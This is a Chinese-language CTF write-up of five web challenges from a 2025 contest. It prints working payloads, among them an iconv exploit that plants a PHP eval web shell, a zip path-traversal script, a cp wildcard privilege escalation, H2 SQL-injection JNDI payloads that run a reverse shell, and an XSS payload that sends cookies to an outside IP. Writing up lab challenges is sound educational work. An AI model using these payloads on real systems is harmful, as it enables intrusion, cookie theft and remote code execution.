+++
date = '2025-02-11T23:00:00+08:00'
draft = false
title = '[2025]N1junior-WP'
author='GSBP'
categories=["WP"]

+++

## Gavatar

一个php服务

这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以

```
if (!empty($_FILES['avatar']['tmp_name'])) {
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    if (!in_array($finfo->file($_FILES['avatar']['tmp_name']), ['image/jpeg', 'image/png', 'image/gif'])) {
        die('Invalid file type');
    }
    move_uploaded_file($_FILES['avatar']['tmp_name'], $avatarPath);
} elseif (!empty($_POST['url'])) {
    $image = @file_get_contents($_POST['url']);
    if ($image === false) die('Invalid URL');
    file_put_contents($avatarPath, $image);
}
```

flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用

也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用

https://www.ambionics.io/blog/iconv-cve-2024-2961-p1

因为不是直接返回文件内容，而是需要我们从`avatar.php`中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可

```
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        self.send(path)
        response=self.session.get("http://39.106.16.204:20871/avatar.php?user=123")
        print(response)
        data = response.text
        return base64.decode(data)
```

然后跑exp就好了

```
python test.py http://39.106.16.204:20871/upload.php "echo '<?=@eval(\$_POST[0]);?>' > shell.php"
```

![image-20250211210919337](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png)

![image-20250211211005193](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211211005193.png)

## tarefik

go服务，代码很少，只有一个main.go,这里可以看到直接写了一个flag接口获取flag

```
r.GET("/flag", func(c *gin.Context) {
		xForwardedFor := c.GetHeader("X-Forwarded-For")

		if !strings.Contains(xForwardedFor, "127.0.0.1") {
			c.JSON(400, gin.H{"error": "only localhost can get flag"})
			return
		}

		flag := os.Getenv("FLAG")
		if flag == "" {
			flag = "flag{testflag}"
		}

		c.String(http.StatusOK, flag)
	})
```

但是我们可以从Dockerfile里面看到实际上并不是直接将服务暴露在外网，而是使用了tarefik进行了一个代理转发

traefik.yml

```
providers:
  file:
    filename: /app/.config/dynamic.yml

entrypoints:
  web:
    address: ":80"
```

dynamic.yml

```
http:
  services:
    proxy:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:8080"

  routers:
    index:
      rule: Path(`/public/index`)
      entrypoints: [web]
      service: proxy
    upload:
      rule: Path(`/public/upload`)
      entrypoints: [web]
      service: proxy
```

只转发了index和upload两个接口

我们这里可以从官方文档知道，转发端口这一些的服务配置，都是可以热加载的

![image-20250211211502362](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211211502362.png)

那我们接下来的目的就是想能否可以重写dynamic.yml，写入我们的配置，将flag端口转发出来就能达到getflag

我们将目光转到upload接口上

```
r.POST("/public/upload", func(c *gin.Context) {
		file, err := c.FormFile("file")
		if err != nil {
			c.JSON(400, gin.H{"error": "File upload failed"})
			return
		}

		randomFolder := randFileName()
		destDir := filepath.Join(uploadDir, randomFolder)

		if err := os.MkdirAll(destDir, 0755); err != nil {
			c.JSON(500, gin.H{"error": "Failed to create directory"})
			return
		}

		zipFilePath := filepath.Join(uploadDir, randomFolder+".zip")
		if err := c.SaveUploadedFile(file, zipFilePath); err != nil {
			c.JSON(500, gin.H{"error": "Failed to save uploaded file"})
			return
		}

		if err := unzipFile(zipFilePath, destDir); err != nil {
			c.JSON(500, gin.H{"error": "Failed to unzip file"})
			return
		}

		c.JSON(200, gin.H{
			"message": fmt.Sprintf("File uploaded and extracted successfully to %s", destDir),
		})
	})
```

unzipFile

```
func unzipFile(zipPath, destDir string) error {
	zipReader, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer zipReader.Close()

	for _, file := range zipReader.File {
		filePath := filepath.Join(destDir, file.Name)
		if file.FileInfo().IsDir() {
			if err := os.MkdirAll(filePath, file.Mode()); err != nil {
				return err
			}
		} else {
			err = unzipSimpleFile(file, filePath)
			if err != nil {
				return err
			}
		}
	}
	return nil
}
```

这里需要我们上传一个zip文件，然后放到unzipFile函数下进行一个解压

看到unzipFile中使用了filepath.Join后，联想到了python里的path.join，想着能否把压缩包内的文件名写成../开头的形式，这样的话我们就能成功目录穿越，然后覆盖配置文件了

尝试出来是可以的，这里我写了个python脚本来达到目的

```
import zipfile

if __name__ == "__main__":
    try:
        binary=open("config/dynamic.yml","r").read()
        zipFile = zipfile.ZipFile("test2.zip", "w", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("test2.zip")
        zipFile.writestr("../../.config/dynamic.yml", binary)
        zipFile.writestr("1234.txt",binary)
        zipFile.close()
    except IOError as e:
        raise e
```

然后dynamic.yml内容如下,由于XFF头的存在，我们还需要额外加一个添加请求头的中间件

```
http:
  middlewares:
    # 定义添加请求头的中间件
    add-headers:
      headers:
        customRequestHeaders:
          X-Forwarded-For: 127.0.0.1     

  services:
    proxy:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:8080"

  routers:
    index:
      rule: Path(`/public/index`)
      entrypoints: [web]
      service: proxy
      middlewares:
        - add-headers  # 应用中间件
    upload:
      rule: Path(`/public/upload`)
      entrypoints: [web]
      service: proxy
      middlewares:
        - add-headers  # 应用中间件
    flag:
      rule: Path(`/flag`)
      entrypoints: [web]
      service: proxy
      middlewares:
        - add-headers
```

![image-20250211212501322](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212501322.png)

![image-20250211212513861](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212513861.png)

## backup

在html的最下面我们可以看到一个注释

![image-20250211212619285](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212619285.png)

然后我们简单绕一下非法传参名就可以了，这是一个shell接口，我们能够直接发命令,所以这里弹个shell方便接下来的操作

![image-20250211212753361](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212753361.png)

flag是400权限，我们这里需要提权

根目录下面发现了一个backup.sh，内容如下

```
#!/bin/bash
cd /var/www/html/primary
while :
do
    cp -P * /var/www/html/backup/
    chmod 755 -R /var/www/html/backup/
    sleep 15s

done
```

一个死循环，重复进行了cp chmod的操作

这里我去ps aux看了一眼，是root一直在执行![image-20250211213018817](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211213018817.png)

那我们接下来就是在这个backup.sh上做下一步操作了

我们想要的是能否在primary目录下创建一个指向/flag的软连接，然后cp将软连接所指向的flag文件复制到backup文件夹下，再利用内部自带的chmod命令使我们可读

但是这里cp使用了-P参数，在help中对该参数解释如下

```
-P, --no-dereference         never follow symbolic links in SOURC
```

这不是寄了吗?

但是cp的对象是*参数，这个\*参数可以帮助我们注入参数项(一些命令的提权手法就是用到这个操作比如chmod tar等等,不了解的可以上网搜搜)

我们想要的参数项是这个,允许复制软连接所对应的文件

```
 -L, --dereference            always follow symbolic links in SOURCE
```

由于两个相反的参数会被位置较后的参数所覆盖，我们接下来的操作就是

1. 创建一个文件名为-L的文件
2. 创建指向flag的软连接
3. 等sh执行
4. cat flag

命令如下

```
cd /var/www/html/primary
>-L
ln -s /flag flag
cd ../backup
cat flag
```

![image-20250211214222306](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211214222306.png)

![image-20250211214231436](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211214231436.png)

## EasyDB

服务给我们的有用接口只有一个登陆接口

```
@PostMapping({"/login"})
    public String handleLogin(@RequestParam String username, @RequestParam String password, HttpSession session, Model model) throws SQLException {
        if (this.userService.validateUser(username, password)) {
            session.setAttribute("username", username);
            return "redirect:/";
        } else {
            model.addAttribute("error", "Invalid username or password");
            return "login";
        }
    }
```

validateUser中存在着sql注入漏洞

```
 public boolean validateUser(String username, String password) throws SQLException {
        String query = String.format("SELECT * FROM users WHERE username = '%s' AND password = '%s'", username, password);
        if (!SecurityUtils.check(query)) {
            return false;
        } else {
            Throwable var8;
            try (Statement stmt = this.connection.createStatement()) {
                stmt.executeQuery(query);
                ResultSet resultSet = stmt.getResultSet();
                Throwable var7 = null;

                try {
                    var8 = resultSet.next();
                } catch (Throwable var31) {
                    var8 = var31;
                    var7 = var31;
                    throw var31;
                } finally {
                    if (resultSet != null) {
                        if (var7 != null) {
                            try {
                                resultSet.close();
                            } catch (Throwable var30) {
                                var7.addSuppressed(var30);
                            }
                        } else {
                            resultSet.close();
                        }
                    }

                }
            }

            return (boolean)var8;
        }
    }
```

然后数据库类型是h2数据库，且executeQuery()支持解析多条语句，那就是很平常的h2打法了，因为题目出网，绕黑名单我用的是JNDI注入，不过不出网的话也可以打其他的，方法很多

payload如下

```
admin';CREATE ALIAS abc AS 'String rce(String cmd) throws Exception {
new javax.naming.InitialContext().lookup(cmd);
return "123";}';--&password=123
```

```\
admin';CALL abc ('ldap://ip:1389/Deserialize/Jackson/Command/反弹shell命令');--&password=123
```

![image-20250211214805890](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211214805890.png)

## display

这题猪了，一开始以为是DOMPurify的0day，看了一个多小时没戏直接跑路玩游戏去了

第二天看到hint出了之后很快就有人解了才返回来看这道题,结果才发现

```
const sanitizedText = sanitizeContent(atob(decodeURI(queryText)));
console.log(sanitizedText)

if (sanitizedText.length > 0) {
    textInput.innerHTML = sanitizedText;             // 写入预览区
    contentDisplay.innerHTML = textInput.innerText;  // 写入效果显示区

    insertButton.disabled = false;    
} else {
    textInput.innerText = "Only allow h1, h2 tags and plain text";
}
```

这里contentDisplay的值是textInput的innerText啊(就是textInput在浏览器上展示的字符)

那就可以很简单的利用html实体编码来绕过

![image-20250211215458831](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211215458831.png)

可以看到很成功的插入我们的标签，但是这里并没有被DOM所渲染，这里就用到hint了

我们使用iframe框架来插入script

```
<iframe srcdoc="<script src='/a/;fetch(%60http://111.229.198.6:5000/%60+document.cookie);//'></script>"></iframe
```

![image-20250211215627738](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211215627738.png)

可以看到成功执行了，也成功被csp拦了(

接下来的绕csp就其实很简单了，在前段时间的sekaiCTF做过相同的题

https://www.justus.pw/writeups/sekai-ctf/tagless.html

就是利用了404的页面来写入我们的js代码，再用src进行引入就行了

这里不讲太多，直接贴payload

```
<iframe srcdoc="<script src='/a/;fetch(%60http://ip:5000/%60+document.cookie);//'></script>"></iframe>
```

![image-20250211215934847](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211215934847.png)